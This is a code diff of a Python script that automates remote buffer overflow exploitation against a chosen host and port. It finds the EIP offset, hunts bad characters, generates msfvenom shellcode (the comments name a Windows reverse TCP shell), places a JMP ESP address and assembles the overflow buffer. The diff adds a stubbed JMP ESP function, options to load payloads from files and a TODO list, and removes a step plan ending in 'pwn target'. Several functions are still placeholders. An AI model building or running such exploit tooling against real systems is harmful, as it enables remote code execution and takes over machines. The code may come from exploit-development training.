@@ -1,36 +1,23 @@
 #!/usr/bin/python3
 
-# Goals:
-# supply arguments ip and port
-# automate remote buffer overflow exploits as much as possible
+# TODOs
+# - Find bad chars function
+# - padding function
+# - Find EIP Address to jump to (JMP ESP)
+# - clean up command line arguments
+#   - add shorthands
+#   - add better helptexts, better formated (new lines, better explanations)
+#   - add good-eip option -> don't ask user
+#   - option to not find any additional bad chars (just use the list provided)
+#   - allow msfvenom options on cli
+#     - flag to not ask for even more options by the user (assume that those are all the options needed)
+#   - add option to save generated payload to file
+#   - add option to save generated buffer that's sent over network to file
+#     - add option to load the generated buffer (prefix, offset, EIP, payload (incl. noop), padding, postfix)
+# - add hints for !mona commands (jmp esp finder, bytearray, compare)
+# - allow user to override already existing options
+# - allow user to delete option existing (single space)
 
-# substeps
-
-# 2.
-# find badchars
-# generate offset byte array \x41
-# fake EIP ABCD for easy recognition
-# append fake payload array \x01 .. \xFF
-# send and ask the user for badchar
-# append badchars to list and resend until user confirms OK
-
-# 3.
-# generate payload with msfvenom
-# ask the user to supply msfvenom arguments:
-# payload, encoder, encrypt, iterations
-# msfvenom returns 2 when failed
-# msfvenom returns 0 when success
-# msfvenom --payload windows/shell/reverse_tcp --list-options
-# ask user for options
-# msfvenom --payload <payload> -b'<badbytes>' -f raw <key=val key=val key=val>
-
-# 4. ask user for jmp esp address
-# 5. ask user to set up handler for payload
-# 6. pwn target
-
-# notes
-# /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l <length> -q <pattern> 2> /dev/null
-#     | grep 'Exact match' | head -n 1 | cut -d' ' -f 6
 
 
 
@@ -45,6 +32,7 @@ def main():
 	print(args)
 	print('='*79)
 	target = (args.host, args.port)
+	
 	eip_offset = args.eip_offset
 	# find EIP offset if not specified
 	if eip_offset < 0:
@@ -67,7 +55,8 @@ def main():
 	# generate buffer
 	overflow = genPattern(eip_offset, args)
 	payload = gen_payload(badbytes, args)
-	buffer = args.prefix + overflow + payload
+	eip = getJmpESPAddr()
+	buffer = args.prefix + overflow + eip + payload
 	padding = gen_padding(len(buffer) + len(args.postfix), badbytes, args)
 	buffer = buffer + padding + args.postfix
 	
@@ -77,6 +66,9 @@ def main():
 	# pwn target
 	
 
+def getJmpESPAddr():
+	return b'\x41\x41\x42\x42'
+
 def check_badbytes(target, badbytes, eip_offset, args):
 	return None
 
@@ -85,8 +77,27 @@ def gen_padding(length_so_far, badbytes, args):
 
 def gen_payload(badbytes, args):
 	# if file was specified, skip all the nonsense.
-	if args.payload_file:
-		return args.payload_file.read()
+	if args.payload_file_bin:
+		print('Reading from File...')
+		payload = args.payload_file_bin.read()
+		print('-' * 20 + 'PAYLOAD' + '-' * 20)
+		print(payload)
+		print('-' * 20 + '  END  ' + '-' * 20)
+		return payload
+	
+	if args.payload_file_hex:
+		print('Reading from File...')
+		payload_hex = args.payload_file_hex.read()
+		print('-' * 20 + 'PAYLOAD HEX' + '-' * 20)
+		print(payload_hex)
+		print('-' * 20 + '    END    ' + '-' * 20)
+		print('')
+		payload = bytes.fromhex(payload_hex)
+		print('-' * 20 + 'PAYLOAD' + '-' * 20)
+		print(payload)
+		print('-' * 20 + '  END  ' + '-' * 20)
+		return payload
+	
 	
 	platform = args.platform_name
 	arch = args.arch_name
@@ -350,8 +361,8 @@ def parse_args():
 	parser.add_argument('--arch-name', dest='arch_name', help='metasploit arch you want to use. If not set will use x86.', default='x86')
 	parser.add_argument('--platform-name', dest='platform_name', help='Platform you want to attack. If not set program will ask you.')
 	parser.add_argument('--encoding-iter', dest='encoding_iter', help='How many iterations of encoding to use.', type=int)
-	parser.add_argument('--payload-file', dest='payload_file', help='File where the payload is stored in hex.', type=argparse.FileType('rb'))
-	
+	parser.add_argument('--payload-file-bin', dest='payload_file_bin', help='File where the payload is stored in raw bytes.', type=argparse.FileType('rb'))
+	parser.add_argument('--payload-file-hex', dest='payload_file_hex', help='File where the payload is stored in hex.', type=argparse.FileType('r'))
 	# parse arguments
 	args = parser.parse_args()
 	
